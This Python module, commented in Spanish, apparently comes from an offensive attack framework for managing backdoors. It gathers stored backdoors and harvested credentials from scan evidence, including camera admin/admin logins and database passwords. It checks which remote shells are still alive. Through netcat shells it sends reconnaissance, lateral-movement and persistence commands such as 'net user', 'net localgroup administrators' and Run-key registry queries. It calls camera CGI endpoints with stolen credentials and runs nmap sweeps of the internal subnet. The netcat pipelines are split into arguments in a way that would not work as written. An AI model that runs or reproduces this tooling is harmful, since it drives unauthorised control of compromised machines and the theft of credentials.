"""
Módulo de Gestión de Backdoors y Accesos Remotos
Permite gestionar conexiones establecidas y ejecutar escaneos desde backdoors
"""

import subprocess
import json
import time
import os
import socket
import requests
from typing import Dict, List, Any, Optional
from pathlib import Path
from modules.logging_system import LoggingSystem
from modules.unified_logging import UnifiedLoggingSystem

class BackdoorManagementModule:
    """Módulo de gestión de backdoors y accesos remotos"""
    
    def __init__(self, config: Dict[str, Any], logger, unified_logging=None):
        self.config = config
        self.logger = logger
        self.logging_system = LoggingSystem(config, logger)
        self.unified_logging = unified_logging
        
        # Directorio de evidencia (ahora en scans/)
        self.evidence_dir = Path("scans/backdoor_management")
        self.evidence_dir.mkdir(parents=True, exist_ok=True)
        
        # Archivo de gestión de backdoors
        self.backdoors_file = self.evidence_dir / "active_backdoors.json"
        self.remote_access_file = self.evidence_dir / "remote_access.json"
        
        # Cargar backdoors existentes
        self.active_backdoors = self._load_backdoors()
        self.remote_access = self._load_remote_access()
        
        # Resultados de gestión
        self.results = {
            'backdoors_managed': [],
            'access_modified': [],
            'scans_executed': [],
            'connections_tested': []
        }
    
    def _load_backdoors(self) -> Dict[str, Any]:
        """Cargar backdoors activos desde archivo"""
        if self.backdoors_file.exists():
            try:
                with open(self.backdoors_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except Exception as e:
                self.logger.error(f"Error cargando backdoors: {e}")
        return {"backdoors": [], "last_updated": time.time()}
    
    def _load_remote_access(self) -> Dict[str, Any]:
        """Cargar accesos remotos desde archivo"""
        if self.remote_access_file.exists():
            try:
                with open(self.remote_access_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except Exception as e:
                self.logger.error(f"Error cargando accesos remotos: {e}")
        return {"remote_access": [], "last_updated": time.time()}
    
    def _save_backdoors(self):
        """Guardar backdoors actualizados"""
        try:
            self.active_backdoors["last_updated"] = time.time()
            with open(self.backdoors_file, 'w', encoding='utf-8') as f:
                json.dump(self.active_backdoors, f, indent=2, ensure_ascii=False)
        except Exception as e:
            self.logger.error(f"Error guardando backdoors: {e}")
    
    def _save_remote_access(self):
        """Guardar accesos remotos actualizados"""
        try:
            self.remote_access["last_updated"] = time.time()
            with open(self.remote_access_file, 'w', encoding='utf-8') as f:
                json.dump(self.remote_access, f, indent=2, ensure_ascii=False)
        except Exception as e:
            self.logger.error(f"Error guardando accesos remotos: {e}")
    
    def _run_command(self, command: List[str], timeout: int = 300) -> Dict[str, Any]:
        """Ejecutar comando y capturar salida"""
        try:
            self.logger.debug(f"🔧 Ejecutando: {' '.join(command)}")
            
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=timeout,
                encoding='utf-8',
                errors='replace'
            )
            
            self.logging_system.log_command(
                ' '.join(command),
                result.stdout + result.stderr,
                result.returncode,
                "BACKDOOR_MANAGEMENT"
            )
            
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'return_code': result.returncode,
                'success': result.returncode == 0
            }
                
        except subprocess.TimeoutExpired:
            self.logger.error(f"⏰ Timeout ejecutando: {' '.join(command)}")
            return {'stdout': '', 'stderr': 'Timeout', 'return_code': -1, 'success': False}
        except Exception as e:
            self.logger.error(f"❌ Error ejecutando comando: {e}")
            return {'stdout': '', 'stderr': str(e), 'return_code': -1, 'success': False}
    
    def discover_existing_backdoors(self, log_file: str = None, scan_id: str = None) -> List[Dict[str, Any]]:
        """Descubrir backdoors existentes desde escaneos específicos o todos los escaneos"""
        self.logger.info("🔍 DESCUBRIENDO BACKDOORS EXISTENTES")
        
        backdoors = []
        
        if scan_id:
            # Cargar desde escaneo específico
            self.logger.info(f"📂 Cargando backdoors desde escaneo: {scan_id}")
            backdoors = self._load_backdoors_from_scan(scan_id)
        elif log_file:
            # Si log_file es un directorio de escaneo, tratarlo como scan_id
            if Path(log_file).is_dir():
                scan_id = Path(log_file).name
                self.logger.info(f"📂 Cargando backdoors desde directorio de escaneo: {scan_id}")
                backdoors = self._load_backdoors_from_scan(scan_id)
            else:
                # Usar log específico proporcionado
                self.logger.info(f"📂 Cargando backdoors desde log: {log_file}")
                backdoors = self._load_backdoors_from_log(log_file)
        else:
            # Buscar en todos los escaneos disponibles
            backdoors = self._discover_backdoors_from_all_logs()
        
        self.active_backdoors["backdoors"] = backdoors
        self._save_backdoors()
        
        self.logger.info(f"✅ Descubiertos {len(backdoors)} backdoors/accesos remotos")
        return backdoors
    
    def _load_backdoors_from_scan(self, scan_id: str) -> List[Dict[str, Any]]:
        """Cargar backdoors desde un escaneo específico"""
        backdoors = []
        
        try:
            from modules.scan_manager import ScanManager
            scan_manager = ScanManager(self.config, self.logger)
            
            if scan_manager.load_scan(scan_id):
                # Cargar datos de persistencia del escaneo
                persistence_data = scan_manager.get_scan_data('persistence')
                if persistence_data and 'backdoors' in persistence_data:
                    backdoors.extend(persistence_data['backdoors'])
                
                # Cargar datos de IoT del escaneo
                iot_data = scan_manager.get_scan_data('iot_exploitation')
                if iot_data and 'remote_access_established' in iot_data:
                    for access in iot_data['remote_access_established']:
                        if access.get('device_type') == 'camera':
                            backdoors.append({
                                'type': 'camera_access',
                                'ip': access['ip'],
                                'port': access['port'],
                                'username': access['username'],
                                'password': access['password'],
                                'access_script': access.get('access_script', ''),
                                'timestamp': access['timestamp']
                            })
                
                # Cargar datos de SQL del escaneo
                sql_data = scan_manager.get_scan_data('sql_exfiltration')
                if sql_data and 'remote_connections' in sql_data:
                    for connection in sql_data['remote_connections']:
                        backdoors.append({
                            'type': 'database_connection',
                            'ip': connection['host'],
                            'port': connection['port'],
                            'username': connection['credentials']['username'],
                            'password': connection['credentials']['password'],
                            'connection_script': connection.get('connection_script', ''),
                            'timestamp': connection['timestamp']
                        })
                
                # Cargar datos de movimiento lateral del escaneo
                lateral_data = scan_manager.get_scan_data('lateral_movement')
                if lateral_data and 'compromised_systems' in lateral_data:
                    for system in lateral_data['compromised_systems']:
                        backdoors.append({
                            'type': 'system_compromise',
                            'ip': system['host'],
                            'port': system.get('port', ''),
                            'username': system.get('username', ''),
                            'password': system.get('password', ''),
                            'method': system.get('access_method', ''),
                            'timestamp': system['timestamp']
                        })
            
        except Exception as e:
            self.logger.error(f"Error cargando backdoors desde escaneo {scan_id}: {e}")
        
        return backdoors
    
    def _load_backdoors_from_log(self, log_file: str) -> List[Dict[str, Any]]:
        """Cargar backdoors desde un log específico"""
        backdoors = []
        
        try:
            # Verificar si es un archivo de log o de evidencia
            if log_file.endswith('.log'):
                backdoors = self._parse_log_file(log_file)
            elif log_file.endswith('.json'):
                backdoors = self._parse_evidence_file(log_file)
            else:
                self.logger.error(f"Formato de archivo no soportado: {log_file}")
                
        except Exception as e:
            self.logger.error(f"Error cargando backdoors desde {log_file}: {e}")
        
        return backdoors
    
    def _parse_log_file(self, log_file: str) -> List[Dict[str, Any]]:
        """Parsear archivo de log para extraer backdoors"""
        backdoors = []
        
        try:
            with open(log_file, 'r', encoding='utf-8') as f:
                content = f.read()
                
                # Buscar backdoors instalados
                if "BACKDOOR_INSTALLED" in content:
                    lines = content.split('\n')
                    for line in lines:
                        if "BACKDOOR_INSTALLED" in line:
                            backdoor_info = self._parse_backdoor_log(line)
                            if backdoor_info:
                                backdoors.append(backdoor_info)
                
                # Buscar compromisos exitosos
                if "COMPROMISE_SUCCESS" in content:
                    lines = content.split('\n')
                    for line in lines:
                        if "COMPROMISE_SUCCESS" in line:
                            compromise_info = self._parse_compromise_log(line)
                            if compromise_info:
                                backdoors.append(compromise_info)
                
                # Buscar accesos remotos establecidos
                if "REMOTE_ACCESS_ESTABLISHED" in content:
                    lines = content.split('\n')
                    for line in lines:
                        if "REMOTE_ACCESS_ESTABLISHED" in line:
                            access_info = self._parse_remote_access_log(line)
                            if access_info:
                                backdoors.append(access_info)
                                
        except Exception as e:
            self.logger.error(f"Error parseando log {log_file}: {e}")
        
        return backdoors
    
    def _parse_evidence_file(self, evidence_file: str) -> List[Dict[str, Any]]:
        """Parsear archivo de evidencia JSON para extraer backdoors"""
        backdoors = []
        
        try:
            with open(evidence_file, 'r', encoding='utf-8') as f:
                data = json.load(f)
                
                # Buscar en diferentes secciones de evidencia
                if isinstance(data, dict):
                    # Evidencia de persistencia
                    if 'backdoors' in data:
                        for backdoor in data['backdoors']:
                            backdoors.append(backdoor)
                    
                    # Evidencia de IoT
                    if 'remote_access_established' in data:
                        for access in data['remote_access_established']:
                            if access.get('device_type') == 'camera':
                                backdoors.append({
                                    'type': 'camera_access',
                                    'ip': access['ip'],
                                    'port': access['port'],
                                    'username': access['username'],
                                    'password': access['password'],
                                    'access_script': access.get('access_script', ''),
                                    'timestamp': access['timestamp']
                                })
                    
                    # Evidencia de SQL
                    if 'remote_connections' in data:
                        for connection in data['remote_connections']:
                            backdoors.append({
                                'type': 'database_connection',
                                'ip': connection['host'],
                                'port': connection['port'],
                                'username': connection['credentials']['username'],
                                'password': connection['credentials']['password'],
                                'connection_script': connection.get('connection_script', ''),
                                'timestamp': connection['timestamp']
                            })
                            
        except Exception as e:
            self.logger.error(f"Error parseando evidencia {evidence_file}: {e}")
        
        return backdoors
    
    def _discover_backdoors_from_all_logs(self) -> List[Dict[str, Any]]:
        """Descubrir backdoors desde todos los escaneos disponibles"""
        backdoors = []
        
        # Buscar en directorios de escaneos
        scans_dir = Path("scans")
        if not scans_dir.exists():
            return backdoors
        
        for scan_dir in scans_dir.iterdir():
            if not scan_dir.is_dir():
                continue
                
            # Buscar archivo de datos unificados
            scan_data_file = scan_dir / "scan_data.json"
            if scan_data_file.exists():
                try:
                    with open(scan_data_file, 'r', encoding='utf-8') as f:
                        scan_data = json.load(f)
                    
                    # Extraer backdoors del sistema unificado
                    persistence_data = scan_data.get("persistence", {})
                    if "backdoors" in persistence_data:
                        backdoors.extend(persistence_data["backdoors"])
                    
                    # Extraer conexiones que pueden ser backdoors
                    connections_data = scan_data.get("connections", {})
                    for conn_type, connections in connections_data.items():
                        for conn in connections:
                            if conn.get("status") == "active":
                                backdoor_info = {
                                    "id": f"conn_{conn_type}_{len(backdoors)}",
                                    "type": f"{conn_type}_connection",
                                    "host": conn.get("host", ""),
                                    "port": conn.get("port", ""),
                                    "username": conn.get("username", ""),
                                    "password": conn.get("password", ""),
                                    "access_script": f"{conn_type} {conn.get('username', '')}@{conn.get('host', '')}:{conn.get('port', '')}",
                                    "created_at": conn.get("established_at", ""),
                                    "status": "active"
                                }
                                backdoors.append(backdoor_info)
                
                except Exception as e:
                    self.logger.error(f"Error leyendo {scan_data_file}: {e}")
                    continue
            
            # Fallback: buscar evidencia de persistencia en cada escaneo (sistema anterior)
            persistence_evidence = scan_dir / "evidence" / "persistence.json"
            if persistence_evidence.exists():
                evidence_backdoors = self._parse_evidence_file(str(persistence_evidence))
                backdoors.extend(evidence_backdoors)
            
            # Fallback: buscar evidencia de IoT en cada escaneo (sistema anterior)
            iot_evidence = scan_dir / "evidence" / "iot_exploitation.json"
            if iot_evidence.exists():
                evidence_backdoors = self._parse_evidence_file(str(iot_evidence))
                backdoors.extend(evidence_backdoors)
            
            # Buscar evidencia de SQL en cada escaneo
            sql_evidence = scan_dir / "evidence" / "sql_exfiltration.json"
            if sql_evidence.exists():
                evidence_backdoors = self._parse_evidence_file(str(sql_evidence))
                backdoors.extend(evidence_backdoors)
            
            # Buscar en logs de consola
            console_logs = scan_dir / "console"
            if console_logs.exists():
                for log_file in console_logs.glob("*.log"):
                    log_backdoors = self._parse_log_file(str(log_file))
                    backdoors.extend(log_backdoors)
        
        return backdoors
    
    def _parse_compromise_log(self, log_line: str) -> Optional[Dict[str, Any]]:
        """Parsear línea de log de compromiso exitoso"""
        try:
            # Formato esperado: "COMPROMISE_SUCCESS: IP:192.168.1.5 TYPE:lateral_movement METHOD:eternalblue"
            if "COMPROMISE_SUCCESS:" in log_line:
                parts = log_line.split("COMPROMISE_SUCCESS:")[1].strip()
                compromise_info = {}
                
                for part in parts.split():
                    if ":" in part:
                        key, value = part.split(":", 1)
                        compromise_info[key.lower()] = value
                
                if 'ip' in compromise_info and 'type' in compromise_info:
                    return {
                        'type': 'system_compromise',
                        'ip': compromise_info['ip'],
                        'port': compromise_info.get('port', ''),
                        'username': compromise_info.get('username', ''),
                        'password': compromise_info.get('password', ''),
                        'method': compromise_info.get('method', ''),
                        'timestamp': time.time()
                    }
        except Exception as e:
            self.logger.debug(f"Error parseando log de compromiso: {e}")
        
        return None
    
    def _parse_remote_access_log(self, log_line: str) -> Optional[Dict[str, Any]]:
        """Parsear línea de log de acceso remoto establecido"""
        try:
            # Formato esperado: "REMOTE_ACCESS_ESTABLISHED: IP:192.168.1.5 TYPE:camera PORT:80 USER:admin PASS:admin"
            if "REMOTE_ACCESS_ESTABLISHED:" in log_line:
                parts = log_line.split("REMOTE_ACCESS_ESTABLISHED:")[1].strip()
                access_info = {}
                
                for part in parts.split():
                    if ":" in part:
                        key, value = part.split(":", 1)
                        access_info[key.lower()] = value
                
                if 'ip' in access_info and 'type' in access_info:
                    return {
                        'type': f"{access_info['type']}_access",
                        'ip': access_info['ip'],
                        'port': access_info.get('port', ''),
                        'username': access_info.get('user', ''),
                        'password': access_info.get('pass', ''),
                        'timestamp': time.time()
                    }
        except Exception as e:
            self.logger.debug(f"Error parseando log de acceso remoto: {e}")
        
        return None
    
    def _parse_backdoor_log(self, log_line: str) -> Optional[Dict[str, Any]]:
        """Parsear línea de log de backdoor"""
        try:
            # Formato esperado: "BACKDOOR_INSTALLED: IP:192.168.1.5 TYPE:netcat PORT:4444"
            if "BACKDOOR_INSTALLED:" in log_line:
                parts = log_line.split("BACKDOOR_INSTALLED:")[1].strip()
                backdoor_info = {}
                
                for part in parts.split():
                    if ":" in part:
                        key, value = part.split(":", 1)
                        backdoor_info[key.lower()] = value
                
                if 'ip' in backdoor_info and 'type' in backdoor_info:
                    return {
                        'type': backdoor_info['type'],
                        'ip': backdoor_info['ip'],
                        'port': backdoor_info.get('port', ''),
                        'username': backdoor_info.get('username', ''),
                        'password': backdoor_info.get('password', ''),
                        'timestamp': time.time()
                    }
        except Exception as e:
            self.logger.debug(f"Error parseando log de backdoor: {e}")
        
        return None
    
    def test_backdoor_connections(self) -> List[Dict[str, Any]]:
        """Probar conexiones de backdoors existentes"""
        self.logger.info("🔗 PROBANDO CONEXIONES DE BACKDOORS")
        
        active_connections = []
        
        for backdoor in self.active_backdoors["backdoors"]:
            ip = backdoor.get('ip', '')
            port = backdoor.get('port', '')
            backdoor_type = backdoor.get('type', '')
            
            if not ip or not port:
                continue
            
            self.logger.info(f"🔍 Probando conexión {backdoor_type} en {ip}:{port}")
            
            # Probar conexión según el tipo
            if backdoor_type in ['netcat', 'powershell', 'python']:
                connection_status = self._test_netcat_connection(ip, port)
            elif backdoor_type == 'camera_access':
                connection_status = self._test_camera_connection(ip, port, backdoor)
            elif backdoor_type == 'database_connection':
                connection_status = self._test_database_connection(ip, port, backdoor)
            else:
                connection_status = self._test_generic_connection(ip, port)
            
            if connection_status['success']:
                active_connections.append({
                    'backdoor': backdoor,
                    'status': 'active',
                    'response_time': connection_status.get('response_time', 0),
                    'timestamp': time.time()
                })
                self.logger.info(f"✅ Conexión activa: {backdoor_type} en {ip}:{port}")
            else:
                self.logger.info(f"❌ Conexión inactiva: {backdoor_type} en {ip}:{port}")
        
        self.results['connections_tested'] = active_connections
        return active_connections
    
    def _test_netcat_connection(self, ip: str, port: str) -> Dict[str, Any]:
        """Probar conexión netcat"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            start_time = time.time()
            result = sock.connect_ex((ip, int(port)))
            response_time = time.time() - start_time
            sock.close()
            
            return {
                'success': result == 0,
                'response_time': response_time
            }
        except:
            return {'success': False, 'response_time': 0}
    
    def _test_camera_connection(self, ip: str, port: str, backdoor: Dict[str, Any]) -> Dict[str, Any]:
        """Probar conexión de cámara"""
        try:
            url = f"http://{ip}:{port}"
            start_time = time.time()
            response = requests.get(url, timeout=10)
            response_time = time.time() - start_time
            
            return {
                'success': response.status_code == 200,
                'response_time': response_time,
                'status_code': response.status_code
            }
        except:
            return {'success': False, 'response_time': 0}
    
    def _test_database_connection(self, ip: str, port: str, backdoor: Dict[str, Any]) -> Dict[str, Any]:
        """Probar conexión de base de datos"""
        try:
            # Probar conexión TCP básica
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            start_time = time.time()
            result = sock.connect_ex((ip, int(port)))
            response_time = time.time() - start_time
            sock.close()
            
            return {
                'success': result == 0,
                'response_time': response_time
            }
        except:
            return {'success': False, 'response_time': 0}
    
    def _test_generic_connection(self, ip: str, port: str) -> Dict[str, Any]:
        """Probar conexión genérica"""
        return self._test_netcat_connection(ip, port)
    
    def execute_remote_scan(self, backdoor: Dict[str, Any], scan_type: str = "reconnaissance") -> Dict[str, Any]:
        """Ejecutar escaneo desde backdoor establecido"""
        self.logger.info(f"🔍 EJECUTANDO ESCANEO REMOTO DESDE {backdoor['type']} en {backdoor['ip']}")
        
        scan_results = {
            'backdoor': backdoor,
            'scan_type': scan_type,
            'timestamp': time.time(),
            'success': False,
            'results': {}
        }
        
        try:
            if backdoor['type'] in ['netcat', 'powershell', 'python']:
                scan_results = self._execute_netcat_scan(backdoor, scan_type)
            elif backdoor['type'] == 'camera_access':
                scan_results = self._execute_camera_scan(backdoor, scan_type)
            elif backdoor['type'] == 'database_connection':
                scan_results = self._execute_database_scan(backdoor, scan_type)
            else:
                scan_results = self._execute_generic_scan(backdoor, scan_type)
            
            if scan_results['success']:
                self.logger.info(f"✅ Escaneo remoto exitoso desde {backdoor['ip']}")
            else:
                self.logger.info(f"❌ Escaneo remoto falló desde {backdoor['ip']}")
                
        except Exception as e:
            self.logger.error(f"Error en escaneo remoto: {e}")
            scan_results['error'] = str(e)
        
        self.results['scans_executed'].append(scan_results)
        return scan_results
    
    def _execute_netcat_scan(self, backdoor: Dict[str, Any], scan_type: str) -> Dict[str, Any]:
        """Ejecutar escaneo desde backdoor netcat"""
        ip = backdoor['ip']
        port = backdoor['port']
        
        # Comandos de escaneo remoto
        scan_commands = {
            'reconnaissance': [
                f'echo "whoami" | nc {ip} {port}',
                f'echo "hostname" | nc {ip} {port}',
                f'echo "ipconfig" | nc {ip} {port}',
                f'echo "netstat -an" | nc {ip} {port}'
            ],
            'lateral_movement': [
                f'echo "net view" | nc {ip} {port}',
                f'echo "net user" | nc {ip} {port}',
                f'echo "net localgroup administrators" | nc {ip} {port}'
            ],
            'persistence': [
                f'echo "schtasks /query" | nc {ip} {port}',
                f'echo "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" | nc {ip} {port}'
            ]
        }
        
        results = {'commands': [], 'output': []}
        
        for command in scan_commands.get(scan_type, []):
            result = self._run_command(command.split(), timeout=30)
            results['commands'].append(command)
            results['output'].append(result['stdout'])
        
        return {
            'backdoor': backdoor,
            'scan_type': scan_type,
            'timestamp': time.time(),
            'success': True,
            'results': results
        }
    
    def _execute_camera_scan(self, backdoor: Dict[str, Any], scan_type: str) -> Dict[str, Any]:
        """Ejecutar escaneo desde cámara"""
        ip = backdoor['ip']
        port = backdoor['port']
        username = backdoor.get('username', 'admin')
        password = backdoor.get('password', 'admin')
        
        # Escaneo de red desde la cámara
        scan_urls = [
            f"http://{ip}:{port}/cgi-bin/main-cgi?json={{\"cmd\":255,\"status\":1,\"flag\":1,\"type\":\"system\",\"user\":\"{username}\",\"password\":\"{password}\"}}",
            f"http://{ip}:{port}/cgi-bin/main-cgi?json={{\"cmd\":255,\"status\":1,\"flag\":1,\"type\":\"network\",\"user\":\"{username}\",\"password\":\"{password}\"}}"
        ]
        
        results = {'urls': [], 'responses': []}
        
        for url in scan_urls:
            try:
                response = requests.get(url, timeout=10)
                results['urls'].append(url)
                results['responses'].append({
                    'status_code': response.status_code,
                    'content_length': len(response.text),
                    'content_preview': response.text[:200]
                })
            except Exception as e:
                results['urls'].append(url)
                results['responses'].append({'error': str(e)})
        
        return {
            'backdoor': backdoor,
            'scan_type': scan_type,
            'timestamp': time.time(),
            'success': True,
            'results': results
        }
    
    def _execute_database_scan(self, backdoor: Dict[str, Any], scan_type: str) -> Dict[str, Any]:
        """Ejecutar escaneo desde base de datos"""
        # Escaneo básico de red desde la base de datos
        ip = backdoor['ip']
        port = backdoor['port']
        
        # Comandos de escaneo de red
        scan_commands = [
            f'nmap -sn 192.168.1.0/24',
            f'nmap -p 80,443,22,21,25,53,110,143,993,995,1433,3389,5432,5900,8080 192.168.1.0/24'
        ]
        
        results = {'commands': [], 'output': []}
        
        for command in scan_commands:
            result = self._run_command(command.split(), timeout=60)
            results['commands'].append(command)
            results['output'].append(result['stdout'])
        
        return {
            'backdoor': backdoor,
            'scan_type': scan_type,
            'timestamp': time.time(),
            'success': True,
            'results': results
        }
    
    def _execute_generic_scan(self, backdoor: Dict[str, Any], scan_type: str) -> Dict[str, Any]:
        """Ejecutar escaneo genérico"""
        return self._execute_netcat_scan(backdoor, scan_type)
    
    def manage_remote_access(self, access_id: str, modifications: Dict[str, Any]) -> Dict[str, Any]:
        """Gestionar acceso remoto específico"""
        self.logger.info(f"🔧 GESTIONANDO ACCESO REMOTO: {access_id}")
        
        # Buscar acceso remoto
        access_found = None
        for access in self.remote_access["remote_access"]:
            if access.get('id') == access_id:
                access_found = access
                break
        
        if not access_found:
            return {'success': False, 'error': 'Acceso remoto no encontrado'}
        
        # Aplicar modificaciones
        original_access = access_found.copy()
        
        for key, value in modifications.items():
            if key in access_found:
                access_found[key] = value
                self.logger.info(f"✅ Modificado {key}: {value}")
        
        # Actualizar timestamp
        access_found['last_modified'] = time.time()
        
        # Guardar cambios
        self._save_remote_access()
        
        # Actualizar logs
        self._update_access_logs(access_id, original_access, access_found)
        
        modification_result = {
            'access_id': access_id,
            'original': original_access,
            'modified': access_found,
            'changes': modifications,
            'timestamp': time.time(),
            'success': True
        }
        
        self.results['access_modified'].append(modification_result)
        return modification_result
    
    def _update_access_logs(self, access_id: str, original: Dict[str, Any], modified: Dict[str, Any]):
        """Actualizar logs con cambios de acceso"""
        try:
            # Crear entrada de log de modificación
            log_entry = {
                'timestamp': time.time(),
                'action': 'ACCESS_MODIFIED',
                'access_id': access_id,
                'original': original,
                'modified': modified,
                'changes': {k: v for k, v in modified.items() if k in original and original[k] != v}
            }
            
            # Guardar en log de gestión
            log_file = self.evidence_dir / "access_modifications.log"
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(json.dumps(log_entry) + '\n')
            
            self.logger.info(f"📝 Log actualizado para acceso {access_id}")
            
        except Exception as e:
            self.logger.error(f"Error actualizando logs: {e}")
    
    def list_active_backdoors(self) -> List[Dict[str, Any]]:
        """Listar backdoors activos"""
        return self.active_backdoors["backdoors"]
    
    def list_remote_access(self) -> List[Dict[str, Any]]:
        """Listar accesos remotos"""
        return self.remote_access["remote_access"]
    
    def run(self) -> Dict[str, Any]:
        """Ejecutar módulo completo de gestión de backdoors"""
        self.logger.info("🚀 INICIANDO MÓDULO DE GESTIÓN DE BACKDOORS")
        
        start_time = time.time()
        
        try:
            # 1. Descubrir backdoors existentes
            backdoors = self.discover_existing_backdoors()
            
            # 2. Probar conexiones
            active_connections = self.test_backdoor_connections()
            
            # 3. Guardar resultados
            self.logging_system.save_json_evidence(
                'backdoor_management_results.json',
                self.results,
                'data'
            )
            
            end_time = time.time()
            duration = end_time - start_time
            
            self.logger.info(f"✅ GESTIÓN DE BACKDOORS COMPLETADA en {duration:.2f} segundos")
            self.logger.info(f"📊 Resumen: {len(backdoors)} backdoors, {len(active_connections)} conexiones activas")
            
            return self.results
            
        except Exception as e:
            self.logger.error(f"❌ Error en gestión de backdoors: {e}")
            return self.results
